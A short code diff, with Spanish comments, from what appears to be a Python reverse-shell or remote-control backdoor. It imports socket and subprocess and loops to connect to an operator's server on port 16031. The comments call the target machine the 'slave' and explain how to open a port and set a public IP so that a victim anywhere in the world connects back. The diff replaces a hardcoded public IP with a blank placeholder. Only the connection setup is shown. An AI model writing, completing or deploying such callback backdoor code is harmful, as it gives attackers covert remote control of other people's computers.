@@ -5,10 +5,10 @@ import socket
 
 import time
 import subprocess
-ip_server = "201.233.74.137" #Aqui Pones tu ip si el exclavo esta en otra parte del mundo tienes que abrir una puerto y poner tu ip publica
+ip_server = "" #Aqui Pones tu ip si el exclavo esta en otra parte del mundo tienes que abrir una puerto y poner tu ip publica e
 
-host = ip_server #
-port = 16031
+host = ip_server 
+port = 16031 # si es publica aqui el puerto que abriste
 started = False
 so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 while True:
